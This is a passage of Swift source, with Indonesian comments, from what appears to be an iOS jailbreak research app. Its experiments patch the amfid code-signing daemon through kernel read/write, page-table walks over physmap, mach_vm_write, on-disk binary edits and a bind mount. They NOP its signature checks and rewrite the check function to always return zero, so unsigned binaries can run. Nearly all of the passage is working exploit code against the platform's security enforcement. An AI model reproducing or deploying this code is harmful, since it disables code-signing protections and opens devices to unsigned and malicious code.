                        detail += "  ... dan \(physmapPatched - 5) lainnya\n"
                    }
                    detail += "\nPhysmap patched: \(physmapPatched)\n\n"

                    if physmapPatched > 0 {
                        detail += "🎉🎉🎉 amfid PATCHED VIA PHYSMAP! 🎉🎉🎉\n\n"
                        detail += "amfid signature check di-NOP langsung di memory!\n"
                        detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
                        detail += "→ Jika spawn berhasil = FULL JAILBREAK!\n\n"
                        detail += "⚠️ Patch hilang jika amfid restart (KeepAlive).\n"
                    } else {
                        detail += "❌ Physmap patch juga gagal.\n"
                        detail += "Page table walk tidak resolve ke physical address yang valid.\n"
                        detail += "Atau: amfid text pages di-protect W^X di hardware level.\n\n"
                        detail += "=== INFO ===\n"
                        detail += "Patched binary tersimpan di: \(patchedPath)\n"
                        detail += "\(bindPatched) instruksi di-NOP di file.\n"
                    }
                }

                if mountRet == 0 {
                    // BIND MOUNT BERHASIL!
                    detail += "\n🎉🎉🎉 BIND MOUNT BERHASIL! 🎉🎉🎉\n"
                    detail += "Patched amfid sekarang di-mount di atas /usr/libexec/amfid\n\n"

                    // Kill amfid → restart dari patched mount
                    detail += "Kill amfid → restart dari patched binary...\n"
                    let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)
                    detail += "kill(\(amfidPid)): ret=\(killRet)\n"

                    RootExecutor.rcall(rc, "usleep", 2000000) // 2s

                    let newAmfid = mgr.findProc(name: "amfid")
                    if newAmfid != 0 {
                        let newPid = ds_kread32(newAmfid + UInt64(off_proc_p_pid))
                        detail += "✅ amfid restarted! New PID: \(newPid)\n\n"
                        detail += "🏆🏆🏆 AMFI BYPASS ACHIEVED! 🏆🏆🏆\n\n"
                        detail += "→ Tap ④ Test Binary Spawn!\n"
                    }
                }

                RootExecutor.rcall(rc, "free", amfidPath)
                RootExecutor.rcall(rc, "free", patchedPathAddr)
                return ExperimentResult(name: expName, success: mountRet == 0 || bindPatched > 0, detail: detail, timestamp: Date())
            }

            detail += "✅ amfid opened for R/W (fd=\(fd))\n"

            // Patch setiap offset: seek + write NOP
            // File offset = offset dari __TEXT start (karena __TEXT fileoff=0)
            rc[nopBuf].setValue32(NOP)

            var diskPatched = 0
            var diskFailed = 0

            for (i, offset) in amfidTextOffsets.enumerated() {
                // Seek ke offset
                let seekRet = RootExecutor.rcall(rc, "lseek", fd, offset, 0) // SEEK_SET=0
                guard seekRet == offset else {
                    diskFailed += 1
                    continue
                }

                // Read original untuk verify
                let readBufDisk = mem + 0x2100
                RootExecutor.rcall(rc, "read", fd, readBufDisk, 4)
                let original = rc[readBufDisk].value32()

                // Verify CBNZ W0
                let isCBNZ = (original >> 24) == 0x35 && (original & 0x1F) == 0
                if !isCBNZ {
                    if i < 3 {
                        detail += "  [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", original)) — skip (bukan CBNZ)\n"
                    }
                    diskFailed += 1
                    continue
                }

                // Seek back dan write NOP
                RootExecutor.rcall(rc, "lseek", fd, offset, 0)
                let writeN = RootExecutor.rcall(rc, "write", fd, nopBuf, 4)

                if writeN == 4 {
                    diskPatched += 1
                    if diskPatched <= 5 {
                        detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", original)) → NOP\n"
                    }
                } else {
                    diskFailed += 1
                    if diskFailed <= 3 {
                        detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): write gagal (ret=\(writeN))\n"
                    }
                }
            }

            // Juga patch fungsi signature check langsung (offset 0x1c830)
            // MOV W0, #0 + RET = always return 0
            let sigCheckOff: UInt64 = 0x1c830
            RootExecutor.rcall(rc, "lseek", fd, sigCheckOff, 0)
            rc[nopBuf].setValue32(0x52800000)     // MOV W0, #0
            rc[nopBuf + 4].setValue32(0xD65F03C0) // RET
            let sigWriteN = RootExecutor.rcall(rc, "write", fd, nopBuf, 8)
            if sigWriteN == 8 {
                diskPatched += 1
                detail += "  ✅ +0x1c830: signature check fn → MOV W0,#0 + RET\n"
            }

            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "free", amfidPath)

            if diskPatched > 5 {
                detail += "  ... dan \(diskPatched - 5) lainnya\n"
            }
            detail += "\nDisk patched: \(diskPatched), failed: \(diskFailed)\n\n"

            if diskPatched > 0 {
                // Kill amfid → launchd restart dari patched binary
                detail += "=== Kill amfid (PID \(amfidPid)) → restart patched ===\n"
                let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)
                detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"

                // Tunggu amfid restart
                RootExecutor.rcall(rc, "usleep", 2000000) // 2 detik

                // Cek apakah amfid sudah restart
                let newAmfid = mgr.findProc(name: "amfid")
                if newAmfid != 0 {
                    let newPid = ds_kread32(newAmfid + UInt64(off_proc_p_pid))
                    detail += "✅ amfid restarted! New PID: \(newPid)\n\n"
                    detail += "🎉🎉🎉 amfid ON-DISK PATCHED + RESTARTED! 🎉🎉🎉\n\n"
                    detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
                    detail += "→ Jika spawn berhasil = FULL JAILBREAK!\n"
                } else {
                    detail += "⚠️ amfid belum restart (mungkin perlu tunggu lebih lama)\n"
                    detail += "Coba tap ④ Test Binary Spawn setelah beberapa detik.\n"
                }

                return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
            } else {
                detail += "❌ Tidak ada byte yang berhasil ditulis ke disk.\n"
                detail += "Filesystem read-only atau permission denied.\n"
                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
            }
        }

        detail += "✅ task_for_pid berhasil! amfid task port = \(amfidTaskPort)\n\n"

        // ── Step 3: Cari amfid __TEXT runtime base ───────────────────
        detail += "=== Step 3: Find amfid __TEXT runtime base ===\n"

        // Baca region info via mach_vm_region untuk konfirmasi base address
        // Atau pakai hardcoded dari Exp 84 Step 2: 0x16cd60000
        // Tapi base bisa berubah tiap launch (ASLR). Cari via mach_vm_region.

        // mach_vm_region_recurse(task, &addr, &size, &depth, &info, &infoCnt)
        // Lebih simpel: coba baca Mach-O magic di beberapa candidate base
        let candidateBases: [UInt64] = [
            0x16cd60000,  // dari Exp 84 sebelumnya
            0x100000000,  // non-ASLR base
        ]

        var amfidTextBase: UInt64 = 0
        let readBuf = mem + 0x1C00
        let readSizeAddr = mem + 0x1D00

        for base in candidateBases {
            // mach_vm_read_overwrite(task, address, size, data, &dataCnt)
            rc[readSizeAddr].setValue64(4)
            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                            UInt64(amfidTaskPort), base, 4,
                                            readBuf, readSizeAddr)
            if readRet == 0 {
                let magic = rc[readBuf].value32()
                detail += "  0x\(String(format: "%llx", base)): magic=0x\(String(format: "%08x", magic))\n"
                if magic == 0xFEEDFACF {
                    amfidTextBase = base
                    detail += "  ✅ Mach-O header found!\n"
                    break
                }
            } else {
                detail += "  0x\(String(format: "%llx", base)): read failed (ret=\(readRet))\n"
            }
        }

        // Jika hardcoded bases gagal, scan via mach_vm_region
        if amfidTextBase == 0 {
            detail += "\nHardcoded bases gagal, scanning via mach_vm_region...\n"
            // Scan dari 0x100000000 ke atas
            let addrPtr = mem + 0x1E00
            let sizePtr = mem + 0x1E08
            let infoPtr = mem + 0x1E10
            let infoCntPtr = mem + 0x1E80
            let depthPtr = mem + 0x1E88

            var scanAddr: UInt64 = 0x100000000
            for _ in 0..<64 {
                rc[addrPtr].setValue64(scanAddr)
                rc[sizePtr].setValue64(0)
                rc[depthPtr].setValue32(0)
                rc[infoCntPtr].setValue32(15) // VM_REGION_SUBMAP_SHORT_INFO_COUNT_64

                let regionRet = RootExecutor.rcall(rc, "mach_vm_region_recurse",
                                                   UInt64(amfidTaskPort),
                                                   addrPtr, sizePtr,
                                                   depthPtr, infoPtr, infoCntPtr)
                if regionRet != 0 { break }

                let regionAddr = rc[addrPtr].value64()
                let regionSize = rc[sizePtr].value64()

                // Try read Mach-O magic
                rc[readSizeAddr].setValue64(4)
                let rr = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                           UInt64(amfidTaskPort), regionAddr, 4,
                                           readBuf, readSizeAddr)
                if rr == 0 {
                    let magic = rc[readBuf].value32()
                    if magic == 0xFEEDFACF {
                        amfidTextBase = regionAddr
                        detail += "  ✅ Found at 0x\(String(format: "%llx", regionAddr)) (size=0x\(String(format: "%llx", regionSize)))\n"
                        break
                    }
                }

                scanAddr = regionAddr + regionSize
                if scanAddr > 0x300000000 { break }
            }
        }

        guard amfidTextBase != 0 else {
            detail += "❌ amfid __TEXT base tidak ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "amfid __TEXT base: 0x\(String(format: "%llx", amfidTextBase))\n\n"

        // ── Step 4: mach_vm_protect — make writable ──────────────────
        detail += "=== Step 4: mach_vm_protect (make writable) ===\n"

        // VM_PROT_READ|WRITE|EXECUTE = 7, set_maximum = false
        let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
                                         UInt64(amfidTaskPort),
                                         amfidTextBase, 0x24000, // size of __TEXT
                                         0, 7) // VM_PROT_ALL = 7
        detail += "mach_vm_protect ret: \(protRet)\n"

        if protRet != 0 {
            detail += "⚠️ mach_vm_protect gagal (ret=\(protRet)) — coba write langsung...\n"
            detail += "Beberapa iOS version allow write tanpa explicit protect change.\n\n"
        } else {
            detail += "✅ __TEXT sekarang writable!\n\n"
        }

        // ── Step 5: Patch CBNZ W0 → NOP ─────────────────────────────
        detail += "=== Step 5: Patch CBNZ W0 → NOP ===\n"

        var patchedCount = 0
        var failedCount = 0

        for (i, offset) in amfidTextOffsets.enumerated() {
            let patchAddr = amfidTextBase + offset

            // Read original instruction first
            rc[readSizeAddr].setValue64(4)
            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                            UInt64(amfidTaskPort), patchAddr, 4,
                                            readBuf, readSizeAddr)
            let originalInstr = rc[readBuf].value32()

            // Verify it's CBNZ W0 (0x35xxxxxx with Rt=0)
            let isCBNZ = (originalInstr >> 24) == 0x35 && (originalInstr & 0x1F) == 0
            if !isCBNZ && readRet == 0 {
                detail += "  [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", originalInstr)) — skip (bukan CBNZ W0)\n"
                continue
            }

            // Write NOP via mach_vm_write
            // mach_vm_write(task, address, data, dataCnt)
            rc[mem + 0x2000].setValue32(NOP)
            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
                                             UInt64(amfidTaskPort), patchAddr,
                                             mem + 0x2000, 4)

            if writeRet == 0 {
                // Verify
                rc[readSizeAddr].setValue64(4)
                RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                  UInt64(amfidTaskPort), patchAddr, 4,
                                  readBuf, readSizeAddr)
                let afterInstr = rc[readBuf].value32()

                if afterInstr == NOP {
                    patchedCount += 1
                    if patchedCount <= 5 {
                        detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", originalInstr)) → NOP\n"
                    }
                } else {
                    failedCount += 1
                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): write OK but verify failed (got 0x\(String(format: "%08x", afterInstr)))\n"
                }
            } else {
                failedCount += 1
                if failedCount <= 3 {
                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): mach_vm_write failed (ret=\(writeRet))\n"
                }
            }
        }

        if patchedCount > 5 {
            detail += "  ... dan \(patchedCount - 5) lainnya\n"
        }

        detail += "\nPatched: \(patchedCount)/\(amfidTextOffsets.count)\n"
        detail += "Failed: \(failedCount)\n\n"

        // ── Step 6: Jika patch gagal, coba patch fungsi target langsung ──
        if patchedCount == 0 {
            detail += "=== Fallback: Patch fungsi signature check ===\n"
            // Fungsi di 0x10001c830 (offset +0x1c830 dari __TEXT base)
            // Patch prologue: MOV W0, #0 (0x52800000) + RET (0xD65F03C0)
            let sigCheckOffset: UInt64 = 0x1c830
            let sigCheckAddr = amfidTextBase + sigCheckOffset

            detail += "Target: 0x\(String(format: "%llx", sigCheckAddr)) (signature check fn)\n"

            // Write MOV W0, #0 + RET (8 bytes)
            rc[mem + 0x2000].setValue32(0x52800000) // MOV W0, #0
            rc[mem + 0x2004].setValue32(0xD65F03C0) // RET

            let writeRet2 = RootExecutor.rcall(rc, "mach_vm_write",
                                              UInt64(amfidTaskPort), sigCheckAddr,
                                              mem + 0x2000, 8)
            detail += "mach_vm_write(MOV W0,#0 + RET): ret=\(writeRet2)\n"

            if writeRet2 == 0 {
                // Verify
                rc[readSizeAddr].setValue64(8)
                RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                  UInt64(amfidTaskPort), sigCheckAddr, 8,
                                  readBuf, readSizeAddr)
                let v0 = rc[readBuf].value32()
                let v1 = rc[readBuf + 4].value32()
                detail += "Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"

                if v0 == 0x52800000 && v1 == 0xD65F03C0 {
                    detail += "✅ Signature check function patched! (always return 0)\n"
                    patchedCount = 1
                } else {
                    detail += "❌ Verify failed.\n"
                }
            }
        }

        // ── Step 7: Result ────────────────────────────────────────────
        detail += "\n=== RESULT ===\n"
        if patchedCount > 0 {
            detail += "🎉🎉🎉 amfid PATCHED! 🎉🎉🎉\n\n"
            detail += "amfid sekarang akan skip signature check.\n"
            detail += "Semua binary dianggap valid oleh amfid.\n\n"
            detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
            detail += "→ Jika spawn berhasil = FULL JAILBREAK ACHIEVED!\n\n"
            detail += "⚠️ Patch hilang jika amfid restart.\n"
            detail += "⚠️ Jangan kill amfid atau respring sebelum test.\n"
        } else {
            detail += "❌ Semua patch gagal.\n\n"
            detail += "Kemungkinan:\n"
            detail += "  1. task_for_pid berhasil tapi mach_vm_write di-block\n"
            detail += "  2. W^X enforcement di iOS 18 (code signing on pages)\n"
            detail += "  3. amfid text pages di-protect APRR/PPL\n\n"
            detail += "Jalur terakhir: patch amfid binary on-disk\n"
            detail += "  → tulis NOP ke /usr/libexec/amfid file\n"
            detail += "  → kill amfid → launchd restart → patched version jalan\n"
        }

        return ExperimentResult(name: expName, success: patchedCount > 0, detail: detail, timestamp: Date())
    }
    #endif

    /// Patch amfid via physmap (v1 — fallback jika task_for_pid gagal)
    /// Target fungsi di amfid (iOS 18):
    ///   - `_MISValidateSignatureAndCopyInfo` — return 0 = valid
    ///   - `_amfi_check_dyld_policy_self` — return 0 = allow
    ///   - Fungsi yang dipanggil via XPC dari kernel AMFI kext
    ///
    /// Kenapa aman (tidak bootloop):
    ///   - amfid adalah userspace daemon, bukan kernel
    ///   - Worst case: amfid crash → restart otomatis (KeepAlive launchd)
    ///   - Tidak ada kernel panic risk
    private func expAmfidPatch() -> ExperimentResult {
        let expName = "amfid Patch (Exp 84)"
        var detail = "Experiment 84: amfid Patch via Physmap\n"
        detail += "=======================================\n\n"

        guard PhysmapConstants.isVerified, let physmap = PhysmapConstants.load() else {
            detail += "❌ Jalankan Physmap Verify (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let gVirtBase = physmap.gVirtBase
        let gPhysBase = physmap.gPhysBase
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // ── Step 1: Find amfid proc ───────────────────────────────────
        detail += "=== Step 1: Find amfid ===\n"
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "❌ amfid tidak ditemukan di process list.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
        detail += "amfid PID: \(amfidPid)\n"

        // Read proc_ro → task
        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
        detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"

        guard amfidTask != 0, isSafeKernelHeapKreadAddress(amfidTask) else {
            detail += "❌ amfid task tidak valid.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 2: Find amfid __TEXT via vm_map ─────────────────────
        detail += "\n=== Step 2: Find amfid __TEXT region ===\n"

        // amfid vm_map dari task
        let amfidVmMap = task_get_vm_map(amfidTask)
        detail += "amfid vm_map: 0x\(String(format: "%llx", amfidVmMap))\n"

        guard amfidVmMap != 0 else {
            detail += "❌ amfid vm_map tidak ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Scan vm_map entries untuk cari region executable (amfid __TEXT)
        // vm_map_entry: +0x00 links.prev, +0x08 links.next, +0x10 start, +0x18 end
        // Cari entry dengan start ~0x100000000 (userspace arm64 text)
        // amfid binary biasanya di /usr/libexec/amfid
        // __TEXT region: executable, start di 0x1000xxxxx range

        var amfidTextStart: UInt64 = 0
        var amfidTextEnd: UInt64 = 0
        var amfidTextPhys: UInt64 = 0

        // Walk vm_map entry list
        // vm_map header: +0x10 = hdr.links.prev, +0x18 = hdr.links.next
        // vm_map_entry: +0x10 = vme_start, +0x18 = vme_end, +0x20 = flags
        let hdrNext = ds_kread64(amfidVmMap + 0x18)
        detail += "vm_map hdr.next: 0x\(String(format: "%llx", hdrNext))\n"

        if hdrNext != 0 && isSafeKernelHeapKreadAddress(hdrNext) {
            var entry = hdrNext
            var scanned = 0
            while entry != 0 && entry != amfidVmMap && scanned < 256 {
                guard isSafeKernelHeapKreadAddress(entry) else { break }
                let vmeStart = ds_kread64(entry + 0x10)
                let vmeEnd   = ds_kread64(entry + 0x18)
                let vmeFlags = ds_kread64(entry + 0x20)

                // amfid __TEXT: userspace arm64, executable, ~0x100000000-0x102000000
                // flags bit 8 = VM_PROT_EXECUTE
                let isExec = (vmeFlags & 0x8) != 0 || (vmeFlags & 0x100) != 0
                let isUserText = vmeStart >= 0x100000000 && vmeStart < 0x200000000

                if isExec && isUserText && amfidTextStart == 0 {
                    amfidTextStart = vmeStart
                    amfidTextEnd   = vmeEnd
                    detail += "✅ amfid __TEXT: 0x\(String(format: "%llx", vmeStart))-0x\(String(format: "%llx", vmeEnd)) flags=0x\(String(format: "%llx", vmeFlags))\n"
                }

                let next = ds_kread64(entry + 0x08)
                if next == entry || next == 0 { break }
                entry = next
                scanned += 1
            }
            detail += "Scanned \(scanned) vm_map entries\n"
        }

        // Fallback: amfid text biasanya mulai di 0x100000000 pada arm64
        if amfidTextStart == 0 {
            detail += "vm_map walk gagal — pakai default amfid text base 0x100000000\n"
            amfidTextStart = 0x100000000
            amfidTextEnd   = 0x102000000
        }

        detail += "amfid text range: 0x\(String(format: "%llx", amfidTextStart))-0x\(String(format: "%llx", amfidTextEnd))\n\n"

        // ── Step 3: Walk page table untuk amfid text → physical address ──
        detail += "=== Step 3: Page table walk amfid text ===\n"

        // Untuk baca/tulis amfid text via physmap, perlu physical address
        // Gunakan kernel pmap chain untuk walk page table amfid
        // amfid pmap ada di amfid task → vm_map → pmap

        // Cari pmap dari amfid vm_map
        var amfidPmap: UInt64 = 0
        if amfidVmMap != 0 {
            // vm_map → pmap biasanya di offset 0x40-0x60
            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60, 0x38] {
                let candidate = ds_kreadptr(amfidVmMap + off)
                if isLikelyKernelPointer(candidate) && pmapCandidateScore(candidate) >= 3 {
                    amfidPmap = candidate
                    detail += "amfid pmap (vm_map+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", candidate))\n"
                    break
                }
            }
        }

        // Walk page table untuk amfid text start
        let targetVA = amfidTextStart
        let l1Idx = (targetVA >> 36) & 0x7
        let l2Idx = (targetVA >> 25) & 0x7FF
        let l3Idx = (targetVA >> 14) & 0x7FF
        let pageOff = targetVA & 0x3FFF

        detail += "Target VA: 0x\(String(format: "%llx", targetVA))\n"
        detail += "L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format: "%x", pageOff))\n"

        var amfidPmapRootOff: UInt64 = 0
        var amfidPmapRootIsL1 = false

        if amfidPmap != 0 {
            // Read L1 root dari amfid pmap
            // +0x00 biasanya kernel VA (pointer ke struct lain)
            // +0x08 biasanya physical TTBR (arm64 page table base)
            // Coba +0x08 dulu (physical TTBR), lalu +0x00 (kernel VA)
            for (off, name) in [(UInt64(8), "+0x08"), (UInt64(0), "+0x00")] {
                // Baca RAW value (tanpa PAC strip) untuk physical address
                let rawVal = ds_kread64_safe(amfidPmap + off)
                // Juga coba PAC-stripped
                let ptrVal = ds_kreadptr(amfidPmap + off)

                // Cek apakah raw value adalah physical TTBR
                let l1Root: UInt64
                if isReasonablePhysTT(rawVal) {
                    l1Root = rawVal
                } else if isReasonablePhysTT(ptrVal) {
                    l1Root = ptrVal
                } else if isKernelOrPhysmapVA(ptrVal) {
                    l1Root = ptrVal
                } else {
                    continue
                }

                // Convert to physmap VA if physical
                let l1VA: UInt64
                if isReasonablePhysTT(l1Root) {
                    l1VA = l1Root &- gPhysBase &+ gVirtBase
                } else {
                    l1VA = l1Root
                }

                guard isSafePhysmapKRWAddress(l1VA) || isSafeKernelKreadAddress(l1VA) else { continue }

                // l1VA adalah base pointer ke root table
                var l2VA = l1VA
                var isL1 = false
                var l1Entry: UInt64 = 0
                var l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)

                if (l2Entry & 0x3) != 0x3 {
                    // Coba asumsi root adalah L1 (47-bit VA space)
                    l1Entry = ds_kread64_safe(l1VA + l1Idx * 8)
                    if (l1Entry & 0x3) == 0x3 {
                        let l2Phys = l1Entry & 0x0000FFFFFFFC0000
                        l2VA = l2Phys &- gPhysBase &+ gVirtBase
                        if isSafePhysmapKRWAddress(l2VA) {
                            l2Entry = ds_kread64_safe(l2VA + l2Idx * 8)
                            isL1 = true
                        }
                    }
                }

                guard l2Entry & 0x3 == 0x3 else { continue }

                let l3Phys = l2Entry & 0x0000FFFFFFFC0000
                let l3VA = l3Phys &- gPhysBase &+ gVirtBase
                guard isSafePhysmapKRWAddress(l3VA) else { continue }

                let l3Entry = ds_kread64_safe(l3VA + l3Idx * 8)
                guard l3Entry & 0x1 == 0x1 else { continue }

                let pagePhys = l3Entry & 0x0000FFFFFFFC0000
                amfidTextPhys = pagePhys
                amfidPmapRootOff = off
                amfidPmapRootIsL1 = isL1

                detail += "✅ Page table walk OK (\(name), rootIsL1=\(isL1))\n"
                if isL1 { detail += "  L1=0x\(String(format: "%llx", l1Entry))\n" }
                detail += "  L2=0x\(String(format: "%llx", l2Entry))\n"
                detail += "  L3=0x\(String(format: "%llx", l3Entry))\n"
                detail += "  amfid text phys: 0x\(String(format: "%llx", pagePhys))\n"
                break
            }
        }

        if amfidTextPhys == 0 {
            detail += "⚠️ Page table walk gagal — coba baca amfid text via KRW langsung\n"
            // amfid text ada di userspace — tidak bisa dibaca via kernel KRW langsung
            // Perlu page table walk yang berhasil
            detail += "❌ Tidak bisa akses amfid text tanpa physical address.\n\n"
            detail += "=== Diagnosis ===\n"
            detail += "amfid pmap: 0x\(String(format: "%llx", amfidPmap))\n"
            detail += "Kemungkinan: amfid pmap offset berbeda di iOS 18.2\n"
            detail += "Atau: amfid text di-protect oleh PPL (page table entries RO)\n\n"
            detail += "=== Dump amfid pmap ===\n"
            if amfidPmap != 0 {
                for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
                    let v = ds_kread64_safe(amfidPmap + off)
                    if v != 0 {
                        detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
                    }
                }
            }
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 4: Baca amfid text via physmap VA ────────────────────
        detail += "\n=== Step 4: Read amfid text via physmap ===\n"

        let amfidTextPhysmapVA = amfidTextPhys &- gPhysBase &+ gVirtBase
        detail += "amfid text physmap VA: 0x\(String(format: "%llx", amfidTextPhysmapVA))\n"

        guard isSafePhysmapKRWAddress(amfidTextPhysmapVA) else {
            detail += "❌ amfid text physmap VA tidak aman.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Baca 32 bytes pertama amfid text untuk verifikasi (Mach-O header)
        let magic = ds_kread32(amfidTextPhysmapVA)
        detail += "amfid text[0]: 0x\(String(format: "%08x", magic))\n"

        let isMachO = magic == 0xFEEDFACF || magic == 0xCEFAEDFE
        if isMachO {
            detail += "✅ Mach-O header confirmed — amfid text readable via physmap!\n\n"
        } else {
            detail += "⚠️ Bukan Mach-O magic (0x\(String(format: "%08x", magic))) — mungkin page offset salah\n"
            detail += "Coba baca beberapa word untuk diagnosa:\n"
            for i: UInt64 in [0, 8, 0x10, 0x18, 0x20] {
                let v = ds_kread64(amfidTextPhysmapVA + i)
                detail += "  +0x\(String(format: "%02x", i)): 0x\(String(format: "%016llx", v))\n"
            }
        }

        // ── Step 5: Scan amfid text untuk pola signature check ────────
        detail += "=== Step 5: Scan amfid text untuk patch target ===\n"
        detail += "Mencari pola ARM64 yang bisa di-patch untuk skip signature check...\n\n"

        // Strategi patch:
        // amfid menerima XPC request dari kernel, memanggil MISValidateSignatureAndCopyInfo
        // Return value 0 = valid, non-zero = invalid
        // Kita cari fungsi yang return non-zero untuk binary tidak valid
        // Patch: ganti dengan instruksi yang selalu return 0
        //
        // ARM64 instruksi:
        //   MOV W0, #0  = 0x52800000
        //   RET         = 0xD65F03C0
        //   NOP         = 0xD503201F
        //   BL target   = 0x94xxxxxx (branch and link)
        //   CBZ W0, lbl = 0x34xxxxxx (compare and branch if zero)
        //   CBNZ W0,lbl = 0x35xxxxxx
        //   B.NE lbl    = 0x54xxxxxx (conditional branch)
        //
        // Target: cari pola "BL + CBZ/CBNZ/B.NE" yang merupakan signature check
        // Atau: cari string reference ke "amfid" / "MISValidate" di text

        var patchTargets: [(va: UInt64, physmapVA: UInt64, original: UInt32, desc: String)] = []
        let scanPages = min(UInt64(amfidTextEnd - amfidTextStart) / 0x4000, 32) // max 32 pages = 512KB

        detail += "Scanning \(scanPages) pages (0x\(String(format: "%llx", scanPages * 0x4000)) bytes)...\n"

        for pageIdx in 0..<scanPages {
            let pageVA = amfidTextStart + pageIdx * 0x4000
            // Walk page table untuk setiap page
            let pIdx = (pageVA >> 14) & 0x7FF
            let p2Idx = (pageVA >> 25) & 0x7FF
            let p1Idx = (pageVA >> 36) & 0x7

            // Reuse root dari amfid pmap
            guard amfidPmap != 0 else { break }
            let rootPtr = ds_kreadptr(amfidPmap + amfidPmapRootOff)
            guard isReasonablePhysTT(rootPtr) || isKernelOrPhysmapVA(rootPtr) else { break }

            let rootVA: UInt64
            if isReasonablePhysTT(rootPtr) {
                rootVA = rootPtr &- gPhysBase &+ gVirtBase
            } else {
                rootVA = rootPtr
            }
            guard isSafePhysmapKRWAddress(rootVA) || isSafeKernelKreadAddress(rootVA) else { break }

            var l2v = rootVA
            if amfidPmapRootIsL1 {
                let l1e = ds_kread64_safe(rootVA + p1Idx * 8)
                if (l1e & 0x3) == 0x3 {
                    let l2p = l1e & 0x0000FFFFFFFC0000
                    l2v = l2p &- gPhysBase &+ gVirtBase
                } else { continue }
            }

            guard isSafePhysmapKRWAddress(l2v) else { continue }
            let l2e = ds_kread64_safe(l2v + p2Idx * 8)
            guard l2e & 0x3 == 0x3 else { continue }

            let l3p = l2e & 0x0000FFFFFFFC0000
            let l3v = l3p &- gPhysBase &+ gVirtBase
            guard isSafePhysmapKRWAddress(l3v) else { continue }
            let l3e = ds_kread64_safe(l3v + pIdx * 8)
            guard l3e & 0x1 == 0x1 else { continue }

            let pagePhys2 = l3e & 0x0000FFFFFFFC0000
            let pagePhysmapVA = pagePhys2 &- gPhysBase &+ gVirtBase
            guard isSafePhysmapKRWAddress(pagePhysmapVA) else { break }

            // Scan instruksi di page ini (4 bytes per instruksi ARM64)
            for instrOff: UInt64 in stride(from: 0, to: 0x4000, by: 4) {
                let instr = ds_kread32(pagePhysmapVA + instrOff)
                let instrVA = pageVA + instrOff
                let instrPhysmapVA = pagePhysmapVA + instrOff

                // Cari pola: BL (0x94xxxxxx) diikuti CBZ/CBNZ W0 (0x34/0x35 xxxxxx)
                // Ini pola umum: call fungsi, check return value
                let isBL = (instr >> 26) == 0x25  // BL instruction
                if isBL && instrOff + 4 < 0x4000 {
                    let nextInstr = ds_kread32(pagePhysmapVA + instrOff + 4)
                    let isCBZ  = (nextInstr >> 24) == 0x34  // CBZ W0
                    let isCBNZ = (nextInstr >> 24) == 0x35  // CBNZ W0
                    let isBNE  = (nextInstr & 0xFF00001F) == 0x54000001  // B.NE

                    if isCBZ || isCBNZ || isBNE {
                        let desc = isCBZ ? "BL+CBZ" : isCBNZ ? "BL+CBNZ" : "BL+B.NE"
                        patchTargets.append((
                            va: instrVA,
                            physmapVA: instrPhysmapVA,
                            original: instr,
                            desc: "\(desc) @ 0x\(String(format: "%llx", instrVA))"
                        ))
                        if patchTargets.count >= 10 { break }
                    }
                }

                // Cari pola: CBNZ W0 (return value check setelah call)
                // Patch CBNZ → NOP agar tidak branch ke error path
                let isCBNZ0 = (instr >> 24) == 0x35 && (instr & 0x1F) == 0  // CBNZ W0
                if isCBNZ0 {
                    patchTargets.append((
                        va: instrVA,
                        physmapVA: instrPhysmapVA,
                        original: instr,
                        desc: "CBNZ W0 @ 0x\(String(format: "%llx", instrVA))"
                    ))
                    if patchTargets.count >= 10 { break }
                }
            }
            if patchTargets.count >= 10 { break }
